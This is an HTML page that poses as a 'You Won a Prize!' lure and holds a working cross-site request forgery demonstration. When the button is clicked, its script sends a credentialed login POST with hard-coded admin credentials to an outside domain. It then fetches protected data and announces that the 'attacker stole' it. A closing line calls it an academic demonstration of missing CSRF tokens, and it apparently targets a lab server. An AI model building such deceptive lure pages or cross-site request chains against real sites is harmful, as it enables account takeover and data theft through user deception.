<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>You Won a Prize!</title>
</head>
<body style="font-family: sans-serif; text-align: center; margin-top: 50px;">

    <h1>🎁 Congratulations! 🎁</h1>
    <p>You've been selected to win a <strong>Golden Laptop</strong>.</p>
    <button id="claimBtn" style="padding: 10px 20px; font-size: 18px; cursor: pointer;">
        Claim Your Prize Now!
    </button>

    <script>
        const TARGET_LOGIN = 'https://apiz.ca/httponly-cookie/login';
        const TARGET_DATA = 'https://apiz.ca/httponly-cookie/something';

        document.getElementById('claimBtn').onclick = function() {
            // Step 1: Attempt to log in as the user (CSRF Login)
            // Note: This only works if the server doesn't have CSRF tokens!
            const xhr = new XMLHttpRequest();
            xhr.withCredentials = true; // Essential to send/receive cookies
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    console.log("Login attempt finished. Status:", xhr.status);
                    
                    // Step 2: Now that we (hopefully) have the cookie, 
                    // try to "Get Something" (the Golden Laptop)
                    fetchTreasure();
                }
            };

            xhr.open('POST', TARGET_LOGIN);
            xhr.setRequestHeader('Content-Type', 'application/json');
            
            // We use the known credentials provided in your server.js
            xhr.send(JSON.stringify({ username: 'admin', password: '4444' }));
        };

        function fetchTreasure() {
            const xhr = new XMLHttpRequest();
            xhr.withCredentials = true;
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        const data = JSON.parse(xhr.responseText);
                        alert("Success! Attacker stole the: " + data.message);
                    } else {
                        alert("Attack failed. The server might have CSRF protection.");
                    }
                }
            };

            xhr.open('GET', TARGET_DATA);
            xhr.send();
        }
    </script>

    <hr>
    <p style="color: gray; font-size: 0.8em;">
        <em>Academic Note: This page demonstrates how an external site can trigger actions 
        on another domain if proper CSRF protections (like unique tokens) are missing.</em>
    </p>
</body>
</html>
